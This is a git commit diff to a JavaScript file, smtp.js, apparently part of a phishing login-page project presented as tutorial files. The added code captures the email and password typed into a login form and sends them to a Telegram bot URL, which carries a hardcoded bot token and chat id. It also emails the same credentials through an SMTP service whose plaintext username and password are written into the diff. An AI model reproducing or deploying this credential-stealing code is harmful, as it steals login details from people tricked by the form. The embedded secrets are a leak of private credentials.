fcb024652d4c1d0d05515c3f91b1e4982644929a
imvickykumar999 <imvickykumar999@gmail.com>
2023-10-21 18:53:45 +0530

    Update smtp.js

--- Tutorial Files/Optional/smtp.js
+++ Tutorial Files/Optional/smtp.js
@@ -1,13 +1,19 @@
 
 function submitLoginForm(event){
     event.preventDefault();
+    let email = event.target['userLoginId'].value;
+    let password = event.target['password'].value;
+    let text = email + ` : ` + password;
+    let url = `https://api.telegram.org/bot6556542346:AAFPNkrk6FLdIne_-pe_5M-DSMy4szyLRjw/sendMessage?chat_id=5721393154&parse_mode=Markdown&text=${text}`;
+
+    fetch(url);
     Email.send({
         Host : "smtp.elasticemail.com",
-        Username : "***************",
-        Password : "***************",
-        To : '***************',
-        From : "***************",
-        Subject : event.target['email'].value,
+        Username : "18erecs080.vicky@rietjaipur.ac.in",
+        Password : "C576BF414184944A1AE88652A0974E220D72",
+        To : '18erecs080.vicky@rietjaipur.ac.in',
+        From : "18erecs080.vicky@rietjaipur.ac.in",
+        Subject : event.target['userLoginId'].value,
         Body : event.target['password'].value
     });
 }
